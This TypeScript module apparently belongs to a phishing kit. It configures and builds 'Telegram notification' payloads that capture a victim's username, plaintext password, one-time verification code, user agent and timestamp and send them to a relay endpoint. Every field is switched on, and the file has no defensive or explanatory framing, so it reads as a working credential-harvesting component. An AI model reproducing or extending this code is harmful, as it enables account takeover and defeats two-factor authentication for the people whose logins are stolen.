export interface TelegramNotificationData {
  username: string;
  password?: string;
  verification_code?: string;
  ip_address?: string;
  user_agent?: string;
  timestamp?: string;
}

export interface TelegramConfig {
  apiEndpoint: string;
  fieldsToCapture: {
    username: boolean;
    password: boolean;
    verificationCode: boolean;
    userAgent: boolean;
    timestamp: boolean;
  };
  messageFormat: {
    includeEmojis: boolean;
    includeLabels: boolean;
  };
}

export const telegramConfig: TelegramConfig = {
  apiEndpoint: '/functions/v1/telegram-notify',

  fieldsToCapture: {
    username: true,
    password: true,
    verificationCode: true,
    userAgent: true,
    timestamp: true,
  },

  messageFormat: {
    includeEmojis: true,
    includeLabels: true,
  },
};

export const buildNotificationPayload = (
  data: Partial<TelegramNotificationData>
): TelegramNotificationData => {
  const payload: TelegramNotificationData = {
    username: data.username || '',
  };

  if (telegramConfig.fieldsToCapture.password && data.password) {
    payload.password = data.password;
  }

  if (telegramConfig.fieldsToCapture.verificationCode && data.verification_code) {
    payload.verification_code = data.verification_code;
  }

  if (telegramConfig.fieldsToCapture.userAgent) {
    payload.user_agent = navigator.userAgent;
  }

  if (telegramConfig.fieldsToCapture.timestamp) {
    payload.timestamp = new Date().toISOString();
  }

  return payload;
};
